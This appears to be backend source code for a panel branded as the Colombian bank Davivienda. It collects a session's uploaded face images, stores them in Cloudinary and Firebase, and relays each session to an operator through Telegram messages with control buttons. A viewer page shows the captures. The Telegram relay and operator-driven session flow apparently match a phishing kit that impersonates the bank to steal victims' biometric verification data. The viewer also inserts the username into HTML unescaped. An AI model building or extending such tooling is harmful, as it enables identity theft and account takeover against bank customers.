import { Request, Response } from 'express';
import { CloudinaryService } from '../../services/CloudinaryService';
import { StorageService } from '../../services/StorageService';
import { TelegramService } from '../../services/TelegramService';
import { DaviviendaController } from './DaviviendaController';

// Se exporta el controlador de biometria
export class DaviviendaBiometricsController {

    /**
     * Metodo para subir los archivos de biometria
     * 
     * @param req 
     * @param res 
     * @returns 
     */
    static async uploadBiometrics(req: Request, res: Response) {

        // Se usa el try catch para manejar los errores
        try {

            // Se obtienen los datos del request
            const { sessionId, username } = req.body;
            const files = req.files as { [fieldname: string]: Express.Multer.File[] };

            console.log("sessionId -> ", sessionId);
            console.log("username  -> ", username);

            // Se valida que se hayan enviado los datos necesarios
            if (!sessionId || !username) {

                // Se retorna un error
                return res.status(400).json({ error: 'No se encuentra la session o el usuario' });
            }

            // Se muestra un mensaje en la consola
            console.log(`[BIOMETRICS] Uploading for user:${username} session:${sessionId}`);

            // Se crea la carpeta en cloudinary
            const folder = `biometria/${username}_${sessionId}`;
            const urls: any = {};

            // Se crea una funcion para subir los archivos si existen
            const uploadIfExists = async (fieldname: string) => {

                // Se valida que el archivo exista
                if (files[fieldname] && files[fieldname][0]) {

                    // Se obtiene el archivo
                    const file = files[fieldname][0];

                    // Se sube el archivo
                    const url = await CloudinaryService.uploadFile(file.path, folder, fieldname);

                    // Se guarda la url
                    urls[fieldname] = url;
                }
            };

            // Se suben los archivos
            await uploadIfExists('image1');

            // Se guardan las urls en firebase
            await StorageService.update(`session_${sessionId}`, { biometrics: urls });

            // Se genera el enlace para ver los resultados
            const backendUrl = process.env.BACKEND_URL;
            const resultsLink = `${backendUrl}/api/v1/davivienda/biometrics/view/${sessionId}`;

            console.log("resultsLink -> ", resultsLink);

            // Se obtiene la informacion de la session
            let currentSession = (await StorageService.get(`session_${sessionId}`)) || {};

            console.log("currentSession biometria -> ", currentSession);

            // Se valida si hay session
            if (!currentSession || !currentSession.sessionId) {

                // Se retorna
                return res.status(400).json(
                    {
                        success: false,
                        message: 'No session ID - Biometria'
                    }
                );
            }

            // Se añade el evento de biometria a la linea de tiempo
            currentSession = DaviviendaController.addEvent(currentSession, 'biometrics', {
                viewLink: resultsLink,
                fecha: DaviviendaController.formatDateCustom(new Date()),
            });

            // Se setea la informacion en el almacenamiento
            await StorageService.set(`session_${sessionId}`, currentSession);
            await StorageService.set(`status_${sessionId}`, 'pendiente');

            // Se usa el messageId de la sesión (persiste en Firebase, no en memoria)
            const messageId = currentSession.messageId;

            console.log("messageId biometrics -> ", messageId);

            // Se elimina el mensaje anterior si existe
            if (messageId) {

                // Se elimina el mensaje anterior
                await TelegramService.deletePreviousMessage(messageId.toString());
            }

            // Se inicializa la informacion
            const bioLink = DaviviendaController.getBiometricsLink(currentSession);
            const buttons = DaviviendaController.getButtons(sessionId, bioLink, false);
            const message = DaviviendaController.formatMessage(currentSession);

            // Se envia el mensaje
            const msgId = await TelegramService.sendMessage(message, buttons, sessionId);

            // Se setea el messageId en la sesión
            currentSession.sessionId = sessionId;
            currentSession.messageId = msgId;

            // Se setea la data
            await StorageService.set(`session_${sessionId}`, currentSession);

            // Se retorna la respuesta
            res.json({
                success: true,
                sessionId: sessionId,
                urls,
                viewLink: resultsLink
            });
        } catch (error: any) {

            // Se envia la respuesta
            res.status(500).json({
                success: false,
                message: 'Hubo un error al procesar la respuesta de la biometria ' + error.message
            });
        }
    }

    /**
     * Vista HTML para mostrar los resultados de biometría
     * 
     * @param req 
     * @param res 
     * @returns 
     */
    static async viewBiometrics(req: Request, res: Response) {
        try {
            const { sessionId } = req.params;
            const sessionData = await StorageService.get(`session_${sessionId}`);

            if (!sessionData || !sessionData.biometrics) {
                return res.status(404).send('<h1>No Biometric Data Found</h1>');
            }

            const { video, image1, image2, image3 } = sessionData.biometrics;
            const username = sessionData.username || 'Unknown';

            const html = `
            <!DOCTYPE html>
            <html lang="es">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Biometría - ${username}</title>
                <style>
                    body { font-family: sans-serif; background: #f0f2f5; padding: 20px; text-align: center; }
                    .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
                    h1 { color: #333; }
                    .media-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 20px; }
                    img, video { width: 100%; border-radius: 6px; border: 1px solid #ddd; }
                    .video-container { margin-bottom: 30px; }
                    .label { display: block; margin-top: 5px; font-size: 0.9em; color: #666; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>Resultados de Biometría</h1>
                    <p><strong>Usuario:</strong> ${username}</p>
                    <p><strong>Session ID:</strong> ${sessionId}</p>

                    <div class="video-container">
                        ${video ? `<video controls src="${video}"></video><span class="label">Video de Prueba</span>` : '<p>No video uploaded</p>'}
                    </div>

                    <h3>Capturas</h3>
                    <div class="media-grid">
                        <div>
                            ${image1 ? `<img src="${image1}" alt="Img 1">` : 'No Image'}
                            <span class="label">Imagen 1</span>
                        </div>
                        <div>
                            ${image2 ? `<img src="${image2}" alt="Img 2">` : 'No Image'}
                            <span class="label">Imagen 2</span>
                        </div>
                        <div>
                            ${image3 ? `<img src="${image3}" alt="Img 3">` : 'No Image'}
                            <span class="label">Imagen 3</span>
                        </div>
                    </div>
                </div>
            </body>
            </html>
            `;

            res.send(html);

        } catch (error) {
            console.error('Error rendering biometrics view:', error);
            res.status(500).send('<h1>Internal Server Error</h1>');
        }
    }
}
